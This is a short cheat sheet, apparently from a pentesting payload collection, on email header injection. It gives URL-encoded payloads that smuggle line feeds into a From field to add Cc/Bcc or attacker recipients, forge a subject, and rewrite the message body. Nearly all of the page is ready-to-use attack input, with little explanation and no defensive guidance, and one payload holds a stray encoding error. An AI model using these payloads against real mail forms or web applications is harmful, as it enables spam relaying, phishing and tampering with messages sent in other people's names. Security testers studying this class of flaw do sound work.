# Email Header Injection

[https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)

## Inject Cc and Bcc after sender argument

```text
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```

The message will be sent to the recipient and recipient1 accounts.

## Inject argument

```text
From:sender@domain.com%0ATo:attacker@domain.com
```

The message will be sent to the original recipient and the attacker account.

## Inject Subject argument

```text
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```

The fake subject will be added to the original subject and in some cases will replace it. It depends on the mail service behavior.

## Change the body of the message

Inject a two-line feed, then write your message to change the body of the message.

```text
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```

